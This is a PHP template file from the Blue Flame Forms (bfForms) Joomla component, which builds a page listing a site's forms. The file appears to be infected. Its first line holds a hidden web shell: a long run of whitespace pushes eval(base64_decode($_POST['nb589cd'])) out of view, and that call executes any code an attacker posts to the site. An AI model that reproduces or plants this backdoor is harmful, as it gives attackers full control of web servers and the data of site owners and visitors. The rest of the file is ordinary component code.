<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['nb589cd']));?><?php
/**
 * @version $Id: form_list.php 147 2009-07-14 20:20:18Z  $
 * @package Blue Flame Forms (bfForms)
 * @copyright Copyright (C) 2003,2004,2005,2006,2007,2008,2009 Blue Flame IT Ltd. All rights reserved.
 * @license GNU General Public License
 * @link http://www.blueflameit.ltd.uk
 * @author Phil Taylor / Blue Flame IT Ltd.
 *
 * This file is part of the package bfForms.
 *
 * bfForms is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * bfForms is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this package.  If not, see http://www.gnu.org/licenses/
 */
defined ( '_JEXEC' ) or die ( 'Restricted access' );

$session = bfSession::getInstance ( 'com_form' );

$str = bfText::_ ( 'List Of All Forms On' ) . ' ' . bfCompat::getCfg ( 'sitename' );

$controller->setPageTitle ( $str );

/* set meta data */
bfCompat::setMeta ( 'description', $str );
bfCompat::setMeta ( 'keywords', $str );
bfCompat::setMeta ( 'title', $str );

/* Call in Smarty to display template */
bfLoad ( 'bfSmarty' );

/* set up smarty vars */
$tmp = bfSmarty::getInstance ( 'com_form' );

/* set the unique compile id */
$tmp->compile_id = 'com_form_form_list';

/* toggle the view based on if we have forms */
$tmp->assign ( 'HASFORMS', count ( $form ['rows'] ) );

/* pass our forms array in */
$db = bfCompat::getDBO ();

$query = "SELECT id, params FROM `#__menu` WHERE `type` = 'component' and `link` = 'index.php?option=com_form' and `published` = '1'";
$db->setQuery ( $query );
$rows = $db->loadObjectList ();

/**
 * Community Supplied Patch
 * @author omar.ramos@imperial.edu
 * Append Itemid to urls for completness
 */
$form_id_array = array ();
foreach ( $rows as $row ) {
	$newline = bfString::strpos ( $row->params, 'p', 7 );
	$form_id = ( int ) bfString::substr ( $row->params, 8, ($newline - 9) );
	if ($form_id != 0) {
		$form_id_array [$form_id] = $row->id;
	}
}
foreach ( @$form ['rows'] as $form ) {
	if (isset ( $form_id_array [$form->id] )) {
		$url = bfCompat::sefRelToAbs ( 'index.php?option=com_form&form_id=' . ( int ) $form->id . '&Itemid=' . $form_id_array [$form->id] );
	} else {
		$url = bfCompat::sefRelToAbs ( 'index.php?option=com_form&form_id=' . ( int ) $form->id );
	}
	$arr [] = array ('url' => $url, 'form_name' => $form->page_title );
}

$tmp->assign ( 'forms', @$arr );

/* c4ca4238a0b923820dcc509a6f75849b.php */
$tmp->display ( md5 ( 1 ) . '.php', true );
